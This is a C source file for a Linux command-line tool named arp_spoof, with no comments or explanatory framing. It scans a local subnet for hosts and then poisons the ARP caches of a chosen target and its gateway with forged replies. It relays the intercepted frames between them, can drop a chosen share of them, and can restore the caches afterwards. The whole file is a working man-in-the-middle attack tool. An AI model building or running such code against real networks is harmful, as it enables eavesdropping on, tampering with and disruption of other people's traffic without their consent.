#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "net_common.h"

#ifndef ETH_ALEN
#define ETH_ALEN 6
#endif

static volatile int g_running = 1;
static uint8_t g_target_mac[ETH_ALEN];
static uint8_t g_gateway_mac[ETH_ALEN];

static void on_signal(int sig) {
    (void)sig;
    g_running = 0;
}

int iface_index(int fd, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) return -1;
    return ifr.ifr_ifindex;
}

int get_iface_mac(int fd, const char *iface, uint8_t *mac) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) return -1;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    return 0;
}

int get_iface_ipv4(int fd, const char *iface, uint32_t *ip) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) return -1;
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    *ip = sin->sin_addr.s_addr;
    return 0;
}

int get_iface_netmask(int fd, const char *iface, uint32_t *mask) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFNETMASK, &ifr) < 0) return -1;
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_netmask;
    *mask = sin->sin_addr.s_addr;
    return 0;
}

int open_raw_socket(int fd_hint, const char *iface) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    int idx = iface_index(fd, iface);
    if (idx < 0) { close(fd); return -1; }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = idx;
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static int send_arp(int fd, int ifindex, uint8_t *dst, uint8_t *src,
                    uint16_t op, uint32_t spa, uint32_t tpa, uint8_t *tha) {
    uint8_t buf[sizeof(struct eth_hdr) + sizeof(struct arp_hdr)];
    memset(buf, 0, sizeof(buf));
    struct eth_hdr *eth = (struct eth_hdr *)buf;
    struct arp_hdr *arp = (struct arp_hdr *)(buf + sizeof(struct eth_hdr));

    memcpy(eth->dst, dst, ETH_ALEN);
    memcpy(eth->src, src, ETH_ALEN);
    eth->ethertype = htons(ETH_P_ARP);

    arp->htype = htons(ARPHRD_ETHER);
    arp->ptype = htons(ETH_P_IP);
    arp->hlen = ETH_ALEN;
    arp->plen = 4;
    arp->op = htons(op);
    memcpy(arp->sha, src, ETH_ALEN);
    arp->spa = spa;
    if (tha) memcpy(arp->tha, tha, ETH_ALEN);
    arp->tpa = tpa;

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_ifindex = ifindex;
    sll.sll_halen = ETH_ALEN;
    memcpy(sll.sll_addr, dst, ETH_ALEN);

    ssize_t n = sendto(fd, buf, sizeof(buf), 0, (struct sockaddr *)&sll, sizeof(sll));
    return n > 0 ? 0 : -1;
}

static uint8_t g_bcast[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};

static void mac_from_str(const char *s, uint8_t *mac) {
    unsigned int b[ETH_ALEN];
    sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
    for (int i = 0; i < ETH_ALEN; i++) mac[i] = (uint8_t)b[i];
}

static void scan(const char *iface) {
    int fd = open_raw_socket(-1, iface);
    if (fd < 0) { fprintf(stderr, "open_raw failed: %s\n", strerror(errno)); exit(2); }

    uint8_t mymac[ETH_ALEN];
    uint32_t myip = 0, mask = 0;
    get_iface_mac(fd, iface, mymac);
    if (get_iface_ipv4(fd, iface, &myip) < 0) { fprintf(stderr, "no ip on %s\n", iface); exit(2); }
    get_iface_netmask(fd, iface, &mask);

    uint32_t net = ntohl(myip & mask);
    uint32_t bcast = ntohl(myip | ~mask);
    int total = bcast - net;
    if (total > 254) total = 254;

    for (int i = 1; i < total; i++) {
        uint32_t tip = htonl(net + i);
        if (tip == myip) continue;
        send_arp(fd, iface_index(fd, iface), g_bcast, mymac, ARPOP_REQUEST, myip, tip, NULL);
        usleep(800);
    }
    close(fd);

    sleep(1);

    FILE *arp = fopen("/proc/net/arp", "r");
    if (!arp) { fprintf(stderr, "cannot read /proc/net/arp\n"); exit(3); }

    char line[256];
    fgets(line, sizeof(line), arp);
    while (fgets(line, sizeof(line), arp)) {
        char ip[32], hw[32], dev[32];
        unsigned int htype, flags;
        int n = sscanf(line, "%31s 0x%x 0x%x %31s %*s %31s", ip, &htype, &flags, hw, dev);
        if (n < 5) continue;
        if (strcmp(dev, iface) != 0) continue;
        if (strcmp(hw, "00:00:00:00:00:00") == 0) continue;
        if (flags == 0) continue;
        printf("%s,%s\n", ip, hw);
    }
    fclose(arp);
}

static void spoof(const char *iface, const char *tip_s, const char *tmac_s,
                  const char *gip_s, const char *gmac_s) {
    int fd = open_raw_socket(-1, iface);
    if (fd < 0) { fprintf(stderr, "open_raw failed: %s\n", strerror(errno)); exit(2); }
    uint8_t mymac[ETH_ALEN], tmac[ETH_ALEN], gmac[ETH_ALEN];
    get_iface_mac(fd, iface, mymac);
    mac_from_str(tmac_s, tmac);
    mac_from_str(gmac_s, gmac);
    uint32_t tip = inet_addr(tip_s);
    uint32_t gip = inet_addr(gip_s);
    int idx = iface_index(fd, iface);

    signal(SIGTERM, on_signal);
    signal(SIGINT, on_signal);

    while (g_running) {
        send_arp(fd, idx, tmac, mymac, ARPOP_REPLY, gip, tip, tmac);
        send_arp(fd, idx, gmac, mymac, ARPOP_REPLY, tip, gip, gmac);
        sleep(2);
    }
    close(fd);
}

static void restore(const char *iface, const char *tip_s, const char *tmac_s,
                    const char *gip_s, const char *gmac_s) {
    int fd = open_raw_socket(-1, iface);
    if (fd < 0) { fprintf(stderr, "open_raw failed: %s\n", strerror(errno)); exit(2); }
    uint8_t mymac[ETH_ALEN], tmac[ETH_ALEN], gmac[ETH_ALEN];
    get_iface_mac(fd, iface, mymac);
    mac_from_str(tmac_s, tmac);
    mac_from_str(gmac_s, gmac);
    uint32_t tip = inet_addr(tip_s);
    uint32_t gip = inet_addr(gip_s);
    int idx = iface_index(fd, iface);

    for (int i = 0; i < 5; i++) {
        send_arp(fd, idx, tmac, mymac, ARPOP_REPLY, gip, tip, gmac);
        send_arp(fd, idx, gmac, mymac, ARPOP_REPLY, tip, gip, tmac);
        usleep(300000);
    }
    close(fd);
}

static void forward_loop(const char *iface, double drop_rate) {
    int fd = open_raw_socket(-1, iface);
    if (fd < 0) { fprintf(stderr, "open_raw failed: %s\n", strerror(errno)); exit(2); }
    uint8_t mymac[ETH_ALEN];
    get_iface_mac(fd, iface, mymac);
    int idx = iface_index(fd, iface);

    signal(SIGTERM, on_signal);
    signal(SIGINT, on_signal);

    uint8_t *buf = (uint8_t *)malloc(65536);
    if (!buf) { fprintf(stderr, "oom\n"); exit(4); }
    srand((unsigned)time(NULL));

    while (g_running) {
        ssize_t n = recv(fd, buf, 65536, 0);
        if (n <= 0) continue;

        struct eth_hdr *eth = (struct eth_hdr *)buf;
        if (memcmp(eth->dst, mymac, ETH_ALEN) != 0) continue;

        uint8_t *newdst = NULL;
        if (memcmp(eth->src, g_target_mac, ETH_ALEN) == 0) newdst = g_gateway_mac;
        else if (memcmp(eth->src, g_gateway_mac, ETH_ALEN) == 0) newdst = g_target_mac;
        else continue;

        if (((double)rand() / RAND_MAX) < drop_rate) continue;

        memcpy(eth->dst, newdst, ETH_ALEN);

        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_protocol = htons(ETH_P_ALL);
        sll.sll_ifindex = idx;
        sll.sll_halen = ETH_ALEN;
        memcpy(sll.sll_addr, newdst, ETH_ALEN);
        sendto(fd, buf, (size_t)n, 0, (struct sockaddr *)&sll, sizeof(sll));
    }
    free(buf);
    close(fd);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage:\n"
                        "  arp_spoof scan <iface>\n"
                        "  arp_spoof spoof <iface> <tip> <tmac> <gip> <gmac>\n"
                        "  arp_spoof restore <iface> <tip> <tmac> <gip> <gmac>\n"
                        "  arp_spoof forward <iface> <drop_rate> <tmac> <gmac>\n");
        return 1;
    }

    const char *cmd = argv[1];
    const char *iface = argv[2];

    if (strcmp(cmd, "scan") == 0) {
        scan(iface);
        return 0;
    }
    if (strcmp(cmd, "spoof") == 0) {
        if (argc < 7) { fprintf(stderr, "spoof needs <iface> <tip> <tmac> <gip> <gmac>\n"); return 1; }
        spoof(iface, argv[3], argv[4], argv[5], argv[6]);
        return 0;
    }
    if (strcmp(cmd, "restore") == 0) {
        if (argc < 7) { fprintf(stderr, "restore needs <iface> <tip> <tmac> <gip> <gmac>\n"); return 1; }
        restore(iface, argv[3], argv[4], argv[5], argv[6]);
        return 0;
    }
    if (strcmp(cmd, "forward") == 0) {
        if (argc < 6) { fprintf(stderr, "forward needs <iface> <drop_rate> <tmac> <gmac>\n"); return 1; }
        double dr = atof(argv[3]);
        if (dr < 0.0) dr = 0.0;
        if (dr > 1.0) dr = 1.0;
        mac_from_str(argv[4], g_target_mac);
        mac_from_str(argv[5], g_gateway_mac);
        forward_loop(iface, dr);
        return 0;
    }

    fprintf(stderr, "unknown command: %s\n", cmd);
    return 1;
}
